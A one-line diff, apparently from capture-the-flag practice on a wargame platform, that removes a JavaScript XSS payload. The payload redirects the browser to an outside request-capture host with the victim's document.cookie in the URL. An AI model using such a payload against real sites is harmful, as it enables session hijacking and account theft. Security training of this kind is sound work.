@@ -1,1 +1,0 @@
-location.href="https://opqjrum.request.dreamhack.games?param="+document.cookie
